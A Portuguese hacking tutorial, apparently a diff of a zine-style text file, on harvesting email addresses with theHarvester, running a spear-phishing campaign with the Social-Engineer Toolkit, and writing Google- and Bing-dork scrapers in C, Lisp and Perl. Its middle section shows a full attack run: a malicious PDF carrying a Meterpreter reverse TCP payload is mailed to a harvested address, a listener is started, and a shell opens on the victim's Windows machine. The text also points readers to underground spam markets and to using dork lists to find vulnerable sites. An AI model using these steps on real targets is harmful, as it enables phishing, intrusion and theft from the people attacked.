+ "O fator humano é o elo mais fraco da segurança"
+                                                 -Kevin Mitnick
+
+  Spammers também desfrutam de e-mails mas até ai você
+ já sabe,no underground uma lista com 2 mil e-mails varia a
+ 50 a 100 dollares , isto lista heterogênica de um estado especifico ,
+ se for homogênica com e-mail do mundo todo o custo cai e muito ,
+ Lista de público especifico sempre tem um preço diferente , questão
+ dos e-mails por região conseguem tal feito acessando "google.mx"
+ que seria para pegar e-mails do mexico por exemplo , tudo gira no
+ "Google Hacking".
+
+  Para entender esse mundo de spammer é bom estudar "BlackHat SEO",
+ No IRC server irc.makecash.org no canal #makecash , la você encontrara
+ gente que ganha 3mil dollares mês ou mais com adsense ou malware , não
+ estou fazendo apologia , só estou mostrando mundos diferentes que giram
+ no assunto de e-mail.
+
+ DOWNLOAD:
+ https://github.com/laramies/theHarvester
+
+ EXEMPLO:
+---------------------------
+
+ $ ./theHavester.py
+ bash: ./theHavester.py: No such file or directory
+ [cooler@malloc laramies-theHarvester-50be8b8]$ python theHavester.py
+ python: can't open file 'theHavester.py': [Errno 2] No such file or directory
+ [cooler@malloc laramies-theHarvester-50be8b8]$ python theHarvester.py
+
+ *************************************
+ *TheHarvester Ver. 2.0 (reborn)     *
+ *Coded by Christian Martorella      *
+ *Edge-Security Research             *
+ *cmartorella@edge-security.com      *
+ *************************************
+
+ Usage: theharvester options
+
+       -d: Domain to search or company name
+       -b: Data source (google,bing,bingapi,pgp,linkedin,google-profiles,exalead,all)
+       -s: Start in result number X (default 0)
+       -v: Verify host name via dns resolution and search for vhosts(basic)
+       -l: Limit the number of results to work with(bing goes from 50 to 50 results,
+            google 100 to 100, and pgp does'nt use this option)
+       -f: Save the results into an XML file
+
+ Examples:./theharvester.py -d microsoft.com -l 500 -b google
+          ./theharvester.py -d microsoft.com -b pgp
+          ./theharvester.py -d microsoft -l 200 -b linkedin
+
+$ python theHarvester.py -d chapolin.com -l 100 -b google
+
+ *************************************
+ *TheHarvester Ver. 2.0 (reborn)     *
+ *Coded by Christian Martorella      *
+ *Edge-Security Research             *
+ *cmartorella@edge-security.com      *
+ *************************************
+
+[-] Searching in Google:
+	Searching 100 results...
+	Searching 200 results...
+
+[+] Emails found:
+ -------------
+ niltonseo@chapolin.com
+ jusecretaria@chapolin.com
+ rhbetao@chapolin.com
+ berica@chapolin.com...
+
+[+] Hosts found
+ -----------
+ 216.21.239.197:www.chapolin.com
+ 216.21.239.197:www2.chapolin.com
+ 216.21.239.197:http.www.www.chapolin.com
+
+---------------------------------------------
+Bom com este exemplo prático você poderá ter um cocktail de e-mails
+
+-0x08 E-mails e o "The Social-Engineer Toolkit"
+================================================
+
+   Está tarefa é considerada por muitos como atividade
+ de "Lammer" ou "Kid" , na real se você esta determinado a
+ atacar,não pode deixar de lado o fator humano,muitos nem sequer
+ tentam "engenharia social" , muitas vezes você ficaria 4 horas
+ para achar uma falha sendo que um "e-mail" com a engenharia social
+ certa poderia quebrar um tabu...
+
+ Uma solução OpenSource "The Social-Engineer Toolkit (SET)", uma
+ ferramenta que é bem famosa até se não me engano teve palestra
+ na defcon sobre ela...
+
+ enfim no site IronGeek tem uma palestra sobre a ferramenta que vale ser vista:
+ http://www.irongeek.com/i.php?page=videos/leveraging-social-engineering-in-your-infosec-program-david-kennedy
+
+DOWNLOAD:
+ svn co http://svn.secmaniac.com/social_engineering_toolkit set/
+
+EXEMPLO:
+-------------------------------------------
+Select from the menu:
+
+1.  Spear-Phishing Attack Vectors
+2.  Website Attack Vectors
+3.  Infectious Media Generator
+4.  Create a Payload and Listener
+5.  Mass Mailer Attack
+6.  Teensy USB HID Attack Vector
+7   Update the Metasploit Framework
+8.  Update the Social-Engineer Toolkit
+9.  Help, Credits, and About
+10. Exit the Social-Engineer Toolkit
+
+Enter your choice: 1
+
+Welcome to the SET E-Mail attack method. This module allows you
+to specially craft email messages and send them to a large (or small)
+number of people with attached fileformat malicious payloads. If you
+want to spoof your email address, be sure "Sendmail" is installed (it
+is installed in BT4) and change the config/set_config SENDMAIL=OFF flag
+to SENDMAIL=ON.
+
+There are two options , one is getting your feet wet and letting SET do
+everything for you (option 1) , the second is to create your own FileFormat
+payload and use it in your own attack. Either way, good luck and enjoy!
+
+1. Perform a Mass Email Attack
+2. Create a FileFormat Payload
+3. Create a Social-Engineering Template
+4. Return to Main Menu
+
+Enter your choice: 1
+
+Select the file format exploit you want.
+The default is the PDF embedded EXE.
+
+        ********** PAYLOADS **********
+
+1. Adobe CoolType SING Table 'uniqueName' Overflow (0day)
+2. Adobe Flash Player 'newfunction' Invalid Pointer Use
+3. Adobe Collab.collectEmailInfo Buffer Overflow
+4. Adobe Collab.getIcon Buffer Overflow
+5. Adobe JBIG2Decode Memory Corruption Exploit
+6. Adobe PDF Embedded EXE Social Engineering
+7. Adobe util.printf() Buffer Overflow
+8. Custom EXE to VBA (sent via RAR) (RAR required)
+9. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
+
+Enter the number you want (press enter for default): 1
+
+1. Windows Reverse TCP Shell
+2. Windows Meterpreter Reverse_TCP
+3. Windows Reverse VNC
+4. Windows Reverse TCP Shell (x64)
+5. Windows Meterpreter Reverse_TCP (X64)
+6. Windows Shell Bind_TCP (X64)
+
+Enter the payload you want (press enter for default):
+[*] Windows Meterpreter Reverse TCP selected.
+Enter the port to connect back on (press enter for default):
+[*] Defaulting to port 443...
+[*] Generating fileformat exploit...
+[*] Please wait while we load the module tree...
+[*] Started reverse handler on 192.168.0.34:443
+[*] Creating 'template.pdf' file...
+[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf
+
+[*] Payload creation complete.
+[*] All payloads get sent to the src/msf_attacks/template.pdf directory
+[*] Payload generation complete. Press enter to continue.
+
+As an added bonus, use the file-format creator in SET to create your attachment.
+
+Right now the attachment will be imported with filename of 'template.whatever'
+
+Do you want to rename the file?
+
+example Enter the new filename: moo.pdf
+
+1. Keep the filename, I don't care.
+2. Rename the file, I want to be cool.
+
+Enter your choice (enter for default): 1
+Keeping the filename and moving on.
+
+Social Engineer Toolkit Mass E-Mailer
+
+There are two options on the mass e-mailer, the first would
+be to send an email to one individual person. The second option
+will allow you to import a list and send it to as many people as
+you want within that list.
+
+What do you want to do:
+
+1. E-Mail Attack Single Email Address
+2. E-Mail Attack Mass Mailer
+3. Return to main menu.
+
+Enter your choice: 1
+
+Do you want to use a predefined template or craft a one time email template.
+
+1. Pre-Defined Template
+2. One-Time Use Email Template
+
+Enter your choice: 1
+Below is a list of available templates:
+--------------------------------------------------------
+
+Repare que o programa nos permite escolher a engenharia social
+é interessante tentar adicionar mais opções de engenharia social
+para assim melhorar sua técnica,fazer adaptações da linguagem
+aproveitar que é OpenSource...
+
+--------------------------------------------------------
+1: Baby Pics
+2: Strange Internet usage from your computer
+3: New Update
+4: LOL...have to check this out...
+5: Dan Brown's Angels & Demons
+6: Computer Issue
+7: Status Report
+
+Enter the number you want to use: 5
+
+Enter who you want to send email to: niltonseo@chapolin.com
+
+What option do you want to use?
+
+1. Use a GMAIL Account for your email attack.
+2. Use your own server or open relay
+
+Enter your choice: 5
+Enter your GMAIL email address: rhbetao@chapolin.com
+Enter your password for gmail (it will not be displayed back to you):
+
+SET has finished delivering the emails.
+
+Do you want to setup a listener yes or no: yes
+[-] ***
+[-] * WARNING: No database support: String User Disabled Database Support
+[-] ***
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+       =[ metasploit v4.0.1-dev [core:4.0 api:1.0]
++ -- --=[ 730 exploits - 374 auxiliary - 81 post
++ -- --=[ 227 payloads - 27 encoders - 8 nops
+       =[ svn r13693 updated today (2011.09.04)
+
+msf >
+
+resource (src/program_junk/meta_config)> use exploit/multi/handler
+resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (src/program_junk/meta_config)> set LHOST 192.168.0.34
+LHOST => 192.168.0.34
+resource (src/program_junk/meta_config)> set LPORT 443
+LPORT => 443
+resource (src/program_junk/meta_config)> set ENCODING shikata_ga_nai
+ENCODING => shikata_ga_nai
+resource (src/program_junk/meta_config)> set ExitOnSession false
+ExitOnSession => false
+resource (src/program_junk/meta_config)> exploit -j
+[*] Exploit running as background job.
+msf exploit(handler) >
+[*] Started reverse handler on 192.168.0.34:443
+[*] Starting the payload handler...
+
+msf exploit(handler) >
+------------------------------------------
+
+Deixamos o terminal aberto e esperamos a vitima abrir o arquivo PDF
+
+------------------------------------------
+[*] Sending stage (748544 bytes) to 192.168.0.76
+[*] Meterpreter session 1 opened (192.168.0.34:443 -> 192.168.0.76:1139) at
+    Thu Sep 04 01:58:06 -0400 2011
+
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 3218 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop>
+------------------------------------------
+
+lembrando que esse foi exemplo bem simples
+
+Bom sugiro que leia o manual  no arquivo "set/readme/User_Manual.pdf"
+por la explica milhares de coisas bacanas para se fazer com esta ferramenta.
+
+-0x09 Introdução a Automação no Google Hacking
+==================================================
+
+  Durante o "Google Hacking" temos que por muita vezes
+ separar as URLs manualmente então abrir uma por uma para
+ investigar qual realmente condiz com que buscamos , com
+ programação simples com "Sockets" podemos fazer tal feito.
+ O mais difícil pode ser apenas o "parser" mas nada que uma
+ regex não resolva , escolha da linguagem de programação fica
+ a seu critério vou tentar ilustrar...
+
+ Vamos a um Exemplo em linguagem C
+ vou comentar as linhas para ajudar no aprendizado...
+
+-----------------------------------
+/*
+Googler v 0.001
+autor:   Cooler_
+contato: c00f3r[at]gmail[dot]com
+
+Just Another Googler Spider
+to help you in google hacking
+
+--------------------------------------------
+THANKS sigsegv and di0_ to help me in debug ;-)
+---
+HOW to USE ?
+apt-get install libcurl-dev; gcc -o Googler Googler.c -lcurl; ./Googler
+
+*/
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <regex.h>
+#include <curl/curl.h>
+#include <curl/types.h>
+#include <curl/easy.h>
+
+char *StrRep(char *st, char *orig, char *repl,const int mim);
+char *regexp (char *string, char *patrn);
+static size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *data);
+void chomp (char * str);
+int WriteFile(char *file,char *str);
+
+void help()
+{
+ puts(
+  "Simple Googler v0.001\n"
+  "./code dork number_of_searchs log.txt\n"
+  " ------------------------------------\n"
+  " by Cooler_ , BugSec Team , contact: c00f3r[at]gmail[dot]com\n"
+ );
+}
+
+struct MemoryStruct {
+ char *memory;
+ size_t size;
+};
+
+int main(int argc, char ** argv)
+{
+ struct MemoryStruct chunk;
+
+// curl vars
+ CURL *curl_handle;
+ curl_global_init(CURL_GLOBAL_ALL);
+
+// Google URL vars
+ char *GOOGLE1="http://www.google.com/search?&q=";
+ char *GOOGLE2="&start=";
+ char *NUM=(char *)malloc(256*sizeof(char));
+ char *GoogleURL=(char *)malloc(768*sizeof(char));
+ char *BUSCA=(char *)malloc(128*sizeof(char));
+ int  times=0;
+//REGEX vars
+ char *match;
+ char **stack=(char **)malloc(3000*sizeof(char *));
+ char *replace="";
+ char *regex="(https?|ftp)+://[^ \t\r\n\v\f]*";
+ int count=0;
+
+ if(argc<3)
+ {
+  help();
+  return 0;
+ }
+
+ BUSCA=argv[1];
+ times=atoi(argv[2]);
+ char *arquivo=argv[3];
+
+ printf("\nProcurando por %s em  %d paginas\n",BUSCA,times);
+
+ while(times)
+ {
+// pack da URL,manipulando os GETs como START == número da página, q == campo de busca
+  strncpy(GoogleURL,GOOGLE1,sizeof(GOOGLE1)*strlen(GOOGLE1));
+  strncat(GoogleURL,BUSCA,sizeof(BUSCA)*strlen(BUSCA));
+  strncat(GoogleURL,GOOGLE2,sizeof(GOOGLE2)*strlen(GOOGLE2));
+  sprintf(NUM,"%d",times);
+  strncat(GoogleURL,NUM,sizeof(NUM));
+  strncat(GoogleURL,"0",sizeof(char));
+
+// veja como fica a URL
+  puts(GoogleURL);
+  puts("------------------\n");
+  chunk.memory=NULL;
+  chunk.size=0;
+
+  curl_handle=curl_easy_init();
+  curl_easy_setopt(curl_handle, CURLOPT_URL,GoogleURL);
+  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION,WriteMemoryCallback);
+  curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA,(void *)&chunk);
+  curl_easy_setopt(curl_handle, CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 ");
+/*
+ UserAgent para diminuir as suspeitas de spider, se tirar isso o Google pode pedir captcha...
+ se for fazer muitas buscas é aconselhavel usar proxy exemplo
+  curl_easy_setopt (curl_handle, CURLOPT_PROXY,"http://127.0.0.1:8118/");
+*/
+  curl_easy_perform(curl_handle);
+  curl_easy_cleanup(curl_handle);
+
+  if(chunk.memory)
+  {
+   while(strstr(chunk.memory,"http"))
+   {
+    match=regexp(chunk.memory,regex);
+// filtro simples para tirar urls do google
+    if( !( strstr(match,"google") || strstr(match,"youtube") || strstr(match,"orkut") || strstr(match,"gstatic")) )
+    {
+// tirando " das urls
+     chomp(match);
+     puts(match);
+// escrevendo no arquivo log
+     WriteFile(arquivo,match);
+//caso queira usar a lista mais tarde...
+     *(stack+count)=match;
+     count++;
+    }
+// apagamos a URL achada para pegar a próxima
+    chunk.memory=StrRep(chunk.memory,match,replace,chunk.size);
+    free(match);
+   }
+  }
+
+  if(chunk.size < 10)
+   free(chunk.memory);
+ // limpamos o buffer do curl para o próximo
+  curl_global_cleanup();
+
+  times--;
+ }
+
+// limpamos a heap
+ free(NUM);
+ free(GoogleURL);
+ free(stack);
+
+ return 0;
+}
+
+static size_t WriteMemoryCallback(void *ptr,size_t size,size_t nmemb,void *data)
+{
+ size_t realsize=size*nmemb;
+ struct MemoryStruct *mem=(struct MemoryStruct *)data;
+ mem->memory=realloc(mem->memory,mem->size+realsize+1);
+  if(mem->memory)
+  {
+   memcpy(&(mem->memory[mem->size]),ptr,realsize);
+   mem->size+=realsize;
+   mem->memory[mem->size]=0;
+  }
+ return realsize;
+}
+
+//string replace
+char *StrRep(char *st,char *orig,char *repl,const int mim)
+{
+ char bufer[mim];
+ char *ch;
+
+  if(!(ch = strstr(st, orig)))
+   return st;
+ strncpy(bufer, st, ch-st);
+ bufer[ch-st] = 0;
+ sprintf(bufer+(ch-st),"%s%s",repl,ch+strlen(orig));
+
+ char *out=bufer;
+
+ return out;
+}
+
+char *regexp(char *string, char *patrn)
+{
+ int i=0,w=0,len=0,begin=0,end=0;
+ char *word=NULL;
+
+ regex_t rgT;
+ regmatch_t match;
+
+ regcomp(&rgT,patrn,REG_EXTENDED);
+
+  if(!(regexec(&rgT,string,1,&match,0)))
+  {
+   begin=(int)match.rm_so;
+   end=(int)match.rm_eo;
+   len=end-begin;
+   word=(char *)malloc(len+1);
+   i=begin;
+   while(i<end)
+    word[w]=string[i],i++,w++;
+   word[w]=0;
+  }
+ regfree(&rgT);
+
+ return word;
+}
+
+//based m0nad's func chomp()
+void chomp(char *str)
+{
+  while(*str)
+  {
+   if(*str=='"')
+   {
+    *str = 0;
+    return;
+   }
+   str++;
+  }
+}
+
+int WriteFile(char *file,char *str)
+{
+ FILE *arq;
+
+ arq=fopen(file,"a");
+  if(!arq)
+  {
+   fprintf(stdout,"error in WriteFile() %s",file);
+   return 0;
+  }
+ fprintf(arq,"%s\n",str);
+ fclose(arq);
+ return 1;
+}
+
+-----------------------------------
+
+  O código em si não esta perfeito ,mas o objetivo
+ foi alcançado.não usei "sockets" para o código não
+ ficar gigante usei o "Curl" e "posix regex" me
+ economizou horas a fio. caso não queira usar a
+ libCurl sugiro api "OrionSocket" do meu amigo IAK,
+ http://code.google.com/p/orionsocket/ ,tem uma curva
+ de aprendizado bem curta...
+
+ Exemplo de Uso:
+----------------------
+                                            /quantas páginas buscar
+                                           |
+ $ ./Googler allinurl:.nasa.gov+-site:nasa 1 log.txt
+                         |                       |
+                        busca                   arquivo onde ficara as URL
+
+ Procurando por allinurl:.nasa.gov+-site:nasa em  1 pagina
+ http://www.google.com/search?&q=allinurl:.nasa.gov+-site:nasa&start=10
+                                   |                                  |
+                                  busca                          número dá página
+                                                                concatenada com ZERO
+ ---------------------
+
+ http://sohowww.nascom.nasa.gov/
+ http://spaceflight.nasa.gov/
+ http://visibleearth.nasa.gov/
+ http://earthobservatory.nasa.gov/
+ http://www.nasa.gov/mission_pages/station/main/index.html
+ http://www.nasa.gov/topics/universe/features/astrobiology_toxic_chemical.html
+ http://www.nasa.gov/topics/universe/features/
+ http://apod.nasa.gov/
+ http://apod.nasa.gov/apod/archivepix.html
+ http://www.top100science.com/www.hq.nasa.gov.html
+ http://wholinkstome.com/url/science.nasa.gov
+
+--------------------------
+
+   Aqui a ideia foi simples buscar nomes de DNS alternativos
+ do host "nasa.gov", nada de mais , apenas para ilustrar uma busca
+ simples , você pode usar para procurar hosts vulneraveis a diversas
+ falhas como Cross site scripting , Sql Injection , File Include ,
+ File Disclosure... entre outras. Claro tendo a lista de URLs
+ na mão você precisará fazer um outro programa,para abrir URL por
+ URL da lista e testar com as devidas paradigmas da vulnerabilidade
+ escolhida.
+
+Exemplo:
+
+--------------------------
+#!/usr/bin/clisp
+; Autor: Antonio "Cooler_"
+; Contato: c00f3r@gmail.com
+;
+; Simple Dork Spider version 0.1 With Common Lisp
+; example to install libs to wheel this code:
+; apt-get install clisp cl-ppcre cl-usocket
+; to use this folow example:
+; chmod +x code; touch vuln.txt;
+; ./code URLlist.txt string2search
+; Bibliotecas usadas
+(asdf:oos 'asdf:load-op :usocket)
+(asdf:oos 'asdf:load-op :cl-ppcre)
+; Pegamos entrada do arquivo e Dork
+(setf nomefile (first ext:*args*))
+(setf dork (second ext:*args*))
+; Vendo se foi passado argumentos
+(if(not nomefile) (format t "~%está faltando argumento do nomefile~%"))
+(if(not dork) (format t "~%está faltando argumento do dork~%"))
+; Abre lista
+(let ((arquivo (open nomefile :if-does-not-exist nil)))
+ (when arquivo
+  (loop for line = (read-line arquivo nil) while line do
+; Peneiramos dados do link , para passar de acordo
+; com paradigmas do protocolo http
+   (setf url (cl-ppcre:scan-to-strings "[^(http|https):\/\/](\\S+)[^\/]" line ))
+   (setf site (cl-ppcre:scan-to-strings "(\\S[^\/]+)[^\/]" url))
+   (setf index (cl-ppcre:scan-to-strings "\/(\\S+)" url))
+; Construimos a socket
+   (setq sock (usocket:socket-connect site 80))
+   (format (usocket:socket-stream sock)
+    "~A~A~A~C~A~A~C~C~C" "GET " index " HTTP/1.1" #\Newline "Host: " site  #\Return #\Newline #\Newline)
+; mostramos saída
+        (force-output (usocket:socket-stream sock))
+        (do ((line
+        (read-line (usocket:socket-stream sock) nil)
+
+--------------------------
+
+caso queira um código que faça o mesmo em C usando a
+libcurl http://bugsec.googlecode.com/files/treant_.c
+código é bem old mais é funcional...
+
+terminando ai um código que busca URLs no BING, ilustrando que é possível
+fazer spider para buscar em outros lugares, nada de mais este código meu já
+tem uns 2 anos de vida ou mais :P
+
+--------------------------
+#!/usr/bin/perl -io
+# load modules
+use LWP;
+use URI;
+use HTML::TokeParser;
+use Term::ANSIColor;
+print color 'red';
+
+sub limpa() {
+ my $cmd=0; my $sys="$^O";
+ if($sys eq "linux") { $cmd="clear"; } else {  $cmd="cls"; }
+ print `$cmd`;
+}
+
+sub banner() {
+ print q{
+     ___           __               __
+    /  _/___ _  _ _\ |___  _ __  | /  \ |
+    \_  \ . \ \/ / . / ._\| `_/ \_\\\  //_/
+    /___/  _/\  /\___\___\|_|    .'/()\`.
+        |_\  /_/                 \ \  / /
+ ::::::::: ::::::::::: ::::    :::  ::::::::
+ :+:    :+:    :+:     :+:+:   :+: :+:    :+:
+ +:+    +:+    +:+     :+:+:+  +:+ +:+
+ +#++:++#+     +#+     +#+ +:+ +#+ :#:
+ +#+    +#+    +#+     +#+  +#+#+# +#+   +#+#
+ #+#    #+#    #+#     #+#   #+#+# #+#    #+#
+ ######### ########### ###    ####  ########
+ ---------------------------------------------
+               Coded By Cooler_
+ ---------------------------------------------
+                 Version 0.1
+}
+}
+
+my @config = (
+ 'User-Agent'=>'Mozilla/4.76 [en] (Win98; U)',
+ 'Accept'=>'image/gif,image/x-xbitmap,image/jpeg,image/pjpeg,image/png, */*',
+ 'Accept-Charset'=>'iso-8859-1',
+ 'Accept-Language'=>'en-US',
+);
+
+$busca=$ARGV[0]; $txt=$ARGV[1];
+print "Searching to: $busca\n save in $txt\n\n";
+if((!$busca)&&(!$txt)) { banner(); print "Please follow the example ./programm dork file.txt\n";
+              print color 'reset'; exit;
+}
+if(($busca)&&($txt)) {
+ for($num=0; $num<=100; $num++) {
+  $url=URI->new('http://www.bing.com/search');
+  $url->query_form( 'q'=>$busca,'go'=>'','filt'=>'all','first'=>$num.'1' );
+  $navegador=LWP::UserAgent->new;
+  my $resultado=$navegador->get($url,@config);
+  $res=$resultado->content;
+  #open(OUT, ">>index.html"); print OUT "$res\n"; close(OUT);
+  #$p = HTML::TokeParser->new("index.html");
+  $p = HTML::TokeParser->new(\$res);
+  while ($p->get_tag("cite")) {
+      my @link = $p->get_trimmed_text("/cite");
+      foreach(@link) { print "$_\n"; }
+      open(OUT, ">>$txt"); print OUT "@link\n"; close(OUT);
+      #unlink("index.html");
+  }
+ }
+ open(OUT,"<$txt"); $line=0; foreach(<OUT>) { if($_ =~ /\S/) { $line+=1; } }
+ limpa(); banner();
+ print "---------------\nTotal off links $line ,save in $txt\n";
+ sleep 1; print color 'reset'; exit;
+}
+--------------------------
+
+se não tiver algum módulo use o CPAN para instalar
+
+ $ cpan -i nome_modulo
+
+-0x0a Agradecimentos
+======================
+ Espero ter ajudado...
+ fico por aqui...
+ ------------------------
+
+ Galera do Bugsec.com.br  "I4K,m0nad,_mlk_,sigsegv,b-man"
+ Galera da freenode dos canais #fym,#reset,#c-br,#calculus,#lisp-br,#gentoo-br,#gdb,#c4ll
+
+ Galera em geral: eremitah,syn_ack,di0,tau,s0n1c,ryonagana,camarllon,twi-john,B4r0n,
+                 memset,vuln,delf0,VonNaturAustreVe,menteBinária(nandu),decoder,
+                 voidpointer(diego rocha),muzgo,mario-goulart,brn,clandestine,
+                 zhide00,sm0k_,darkside,madrand,f117,t0kata,edenc e nibles.
+
+ visite ai http://coolerlab.wordpress.com
+           http://code.google.com/u/c00f3r/
+           https://github.com/CoolerVoid/
+
+           _____
+         .:     :.
+        (_________)
+     __     | |
+   .:  :.   | |
+  (______)  / /
+     ||    / /
+     ||   / / __
+   _ ||  | | (__)          ,
+  (_) \\010|  ||        .;       _..--,
+   \\.0101010110.      ;':      '  ',,,\    .^.                      .^.     .^.
+   .0101011010101.     ;_;             '|_          ,'
+  .100101010101011.    |              .;;;;.,     ,':     .^.      '.   .^.
+                   ,;::;:::..      ..;;;;;;;;.. :_,'             .;'
+    .^.          .'     '':::;._.;;::::''''':;::;/'             .;:;
+                .          ':::::::;;'      ':::::          ...;:               .^.
+  .^.                         ':::'          /':::;      ..:::::;:..::::::::..      .^.
+          .^.          .^.       ;         ,'; ':::;;...;::;;;;' ';;.        .^.
+                            ,,,_/          ; ;   ';;:;::::'          '.
+   .^.                   ..'  ,'           ;'         ''\             '
+         .^.            '  '''     .^.    '              ;'.    .^.     .^.
+                                                         : :        .^.
